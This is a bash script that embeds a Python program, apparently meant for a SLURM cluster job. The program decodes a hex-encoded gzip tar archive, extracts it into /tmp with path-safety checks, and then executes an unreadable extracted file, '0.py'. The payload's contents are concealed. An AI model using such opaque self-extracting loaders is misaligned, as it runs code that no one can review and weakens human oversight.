#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed95416fdb2014c77bf6a740b9d89622028e8ded5439eebec3b64b555518e39834311690b5d9b4ef3eb0a3aa55a5ddda6edafb1d8cb179ff07eff180e0bdd5c3d59b423c8c90a925af5bb25ee74feff37756b2f20a91b79dd6ccc93a6ebccbf7f0f517f273e1f4bd1c161bb4e00da1d93a2f5859d58b255a8cfc7cd0bcbdb33dcf0a1646504e45d9d0ba6055dbd45959904ab246b65557b38e7545470a59b3baa2b9208c4a2a1a41a47f2b2bd130d6bd506dce4e5a2f5aac6b926734fc39f0e199b3baa45926caaa2964e1dd3196d73c6f5bb9264521dab26844d6951d2945c684e00d6dcbb5a8086964c3f3ae6ccbc5af8f8eedbf00c1e3f9cd7dfcb9fe29a5afea3fcfd750ffef813a8eda3864cf76192e8265cf6d7f50cdd207a553071975461fd1c85df8882e833ffb6e64b6a149bc21e666f7fd86dea6d7621b3470a86f9b24661593e97689536ca42f79271f5d92a6119f4de3d568f45e0ab712fa783c0dca9d57fbfd599e865d9caec44d3c9d4cf16d9071bb1f71c4ad95defd658a783e2a123e8b4fe78957c7bd7c6cd54e5aef6abbf52a2f8fb1f8367a50ae4797f5613dca21e129e216b94d843a6d90446a983a487568d00e493cf0a3c461a3381bac93581bd173d3def594ace27423f4e0d47092cf6d940d0e921479c918e338a84eeb9ee5523c06b98de1ca4af48d1f4ef29331da24f1d7c1f22e4c623cb938f592e3d687728c57b3e1f5182ce5e0f0f1be5526993b76fbc59ce4523e2aebeef4fdd44bfdd007a39cbc04c7619f00c3859b2626e7ac84848424861c633584082764699d4926a7feefb4059e2d18eff5d35638723544e1919834fae8bd0c00000000000000000000000000000000000000000000ff2bbf016a5fd81200280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
